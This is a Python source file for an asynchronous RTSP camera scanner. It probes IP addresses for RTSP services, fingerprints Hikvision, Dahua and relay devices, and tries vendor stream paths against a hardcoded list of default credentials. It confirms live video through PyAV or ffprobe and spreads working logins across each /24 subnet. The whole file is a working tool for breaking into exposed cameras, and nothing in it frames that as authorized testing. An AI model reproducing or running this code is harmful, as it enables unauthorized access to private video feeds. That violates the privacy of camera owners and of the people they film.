import asyncio
import base64
import hashlib
import re
import subprocess
import os
import ipaddress

try:
    import av
    AV_OK = True
except ImportError:
    AV_OK = False

# --- Constants ---
VENDOR_MAP = {
    "relay_server": ["/live", "/stream", "/0", "/1", "/1/1", "/live/0/1", "/mpeg4", "/h264"],
    "hikvision": ["/Streaming/Channels/101", "/Streaming/Channels/1", "/h264/ch1/main/av_stream", "/ISAPI/streaming/channels/101"],
    "dahua": ["/cam/realmonitor?channel=1&subtype=0", "/cam/realmonitor?channel=1&subtype=1", "/live", "/h264"],
    "media_receiver": ["/1/1", "/1/2", "/2/1", "/live/0/1", "/cam/realmonitor?channel=1"],
    "generic": ["", "/live", "/stream", "/video", "/cam", "/11", "/12", "/ch01.264"]
}

CREDS = [
    ("admin", "admin"), ("admin", "12345"), ("admin", ""), ("root", "root"),
    ("admin", "123456"), ("user", "user"), ("admin", "1111111"), ("admin", "888888"),
    ("admin", "password"), ("admin", "12345678"), ("admin", "9999")
]

def make_digest_auth(user, passwd, method, uri, realm, nonce):
    ha1 = hashlib.md5(f"{user}:{realm}:{passwd}".encode()).hexdigest()
    ha2 = hashlib.md5(f"{method}:{uri}".encode()).hexdigest()
    response = hashlib.md5(f"{ha1}:{nonce}:{ha2}".encode()).hexdigest()
    return (f'Digest username="{user}", realm="{realm}", nonce="{nonce}", uri="{uri}", response="{response}"')

def build_rtsp_req(method, url, seq, user="", passwd="", auth_header=None):
    lines = [f"{method} {url} RTSP/1.0", f"CSeq: {seq}", "User-Agent: IFAC-QuantumHunter/8.8", "Accept: application/sdp"]
    if auth_header: lines.append(f"Authorization: {auth_header}")
    elif user and "user=" not in url.lower():
        cred = base64.b64encode(f"{user}:{passwd}".encode()).decode()
        lines.append(f"Authorization: Basic {cred}")
    lines += ["", ""]
    return "\r\n".join(lines).encode()

def av_validate(url):
    if AV_OK:
        opts = {"rtsp_transport": "tcp", "stimeout": "4000000", "analyzeduration": "1000000"}
        try:
            with av.open(url, options=opts, timeout=5.0) as container:
                v = next((s for s in container.streams if s.type == "video"), None)
                if v: return {"codec": (v.codec_context.name or "??").upper(), "res": f"{v.codec_context.width}x{v.codec_context.height}", "fps": int(v.average_rate or 0)}
        except: pass
    
    try:
        cmd = ["ffprobe", "-v", "error", "-select_streams", "v:0", "-show_entries",
               "stream=codec_name,width,height,avg_frame_rate", "-of", "csv=p=0", url]
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
        try:
            raw, _ = proc.communicate(timeout=6)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.communicate()
            return None
        out = raw.decode().strip().split(",")
        if len(out) >= 4:
            fps = 0
            if "/" in out[3]:
                a, b = map(float, out[3].split("/"))
                fps = int(a / b) if b > 0 else 0
            return {"codec": out[0].upper(), "res": f"{out[1]}x{out[2]}", "fps": fps}
    except: pass
    return None

def extract_sdp_paths(body, ip, port):
    paths = []
    for m in re.finditer(r'a=control:(rtsp://[^\s\r\n]+)', body, re.I):
        paths.append(m.group(1).replace(f"rtsp://{ip}:{port}", "").replace(f"rtsp://{ip}", ""))
    for m in re.finditer(r'a=control:([^\s\r\n]+)', body, re.I):
        val = m.group(1).strip()
        if not val.startswith('rtsp://') and val != '*':
            paths.append(val if val.startswith('/') else f"/{val}")
    return list(dict.fromkeys(paths))

async def probe_ip(ip, port, timeout, rir, cc):
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=timeout)
        writer.write(build_rtsp_req("OPTIONS", f"rtsp://{ip}:{port}/", 1))
        await writer.drain()
        data = await asyncio.wait_for(reader.read(2048), timeout=timeout)
        banner = data.decode("utf-8", errors="replace").strip()
        writer.close(); await writer.wait_closed()
        if "RTSP/1.0" in banner:
            return {"ip": ip, "rir": rir, "cc": cc, "status": "open", "banner": banner[:400]}
    except: pass
    return None

async def run_deep_probe(ip, port, rir, cc, rtsp_banner, executor, swarm_memory, swarm_lock, swarm_ttl, on_success):
    vendor = "generic"
    b_low = rtsp_banner.lower()
    is_relay = "RECORD" in rtsp_banner.upper() and "PAUSE" not in rtsp_banner.upper()
    if is_relay: vendor = "relay_server"
    elif "announce" in rtsp_banner.upper(): vendor = "media_receiver"
    elif "hikvision" in b_low or re.search(r'realm="Login to [a-f0-9]{32}"', rtsp_banner): vendor = "hikvision"
    elif "dahua" in b_low: vendor = "dahua"

    subnet = str(ipaddress.ip_network(f"{ip}/24", strict=False))
    golden_key = None
    async with swarm_lock:
        entry = swarm_memory.get(subnet)
        if entry:
            path, u, p, ts = entry
            if asyncio.get_running_loop().time() - ts < swarm_ttl: # Usando loop time pra consistência
                golden_key = (path, u, p)
            else:
                del swarm_memory[subnet]
    
    if golden_key:
        if await _try_specific_cred(ip, port, golden_key[0], golden_key[1], golden_key[2], rir, cc, rtsp_banner, f"{vendor} (Swarm)", executor, on_success):
            return True

    # SDP Discovery
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=2.5)
        writer.write(build_rtsp_req("DESCRIBE", f"rtsp://{ip}:{port}/", 1))
        await writer.drain()
        data = await asyncio.wait_for(reader.read(4096), timeout=2.5)
        writer.close(); await writer.wait_closed()
        if b"200 OK" in data:
            for sp in extract_sdp_paths(data.decode("utf-8", errors="ignore"), ip, port):
                if await _try_path_with_creds(ip, port, sp, rir, cc, rtsp_banner, f"{vendor} (SDP)", executor, swarm_memory, swarm_lock, on_success):
                    return True
    except: pass

    test_paths = list(dict.fromkeys(VENDOR_MAP.get(vendor, []) + VENDOR_MAP["generic"]))
    for path in test_paths:
        if await _try_path_with_creds(ip, port, path, rir, cc, rtsp_banner, vendor, executor, swarm_memory, swarm_lock, on_success):
            return True
    return False

async def _try_specific_cred(ip, port, path, u, p, rir, cc, banner, vendor, executor, on_success):
    f_path = path.replace("{u}", u).replace("{p}", p)
    url = f"rtsp://{ip}:{port}{f_path}" if "user=" in path.lower() else (f"rtsp://{u}:{p}@{ip}:{port}{f_path}" if u else f"rtsp://{ip}:{port}{f_path}")
    meta = await asyncio.get_running_loop().run_in_executor(executor, av_validate, url)
    if meta:
        await on_success(ip, url, rir, cc, banner, vendor, meta)
        return True
    return False

async def _try_path_with_creds(ip, port, path, rir, cc, banner, vendor, executor, swarm_memory, swarm_lock, on_success):
    for user, pwd in [(None, None)] + CREDS:
        u, p = (user or "", pwd or "")
        f_path = path.replace("{u}", u).replace("{p}", p)
        url = f"rtsp://{ip}:{port}{f_path}" if "user=" in path.lower() else (f"rtsp://{u}:{p}@{ip}:{port}{f_path}" if u else f"rtsp://{ip}:{port}{f_path}")
        meta = await asyncio.get_running_loop().run_in_executor(executor, av_validate, url)
        if meta:
            subnet = str(ipaddress.ip_network(f"{ip}/24", strict=False))
            async with swarm_lock:
                swarm_memory[subnet] = (path, u, p, asyncio.get_running_loop().time())
            await on_success(ip, url, rir, cc, banner, vendor, meta)
            return True
    return False
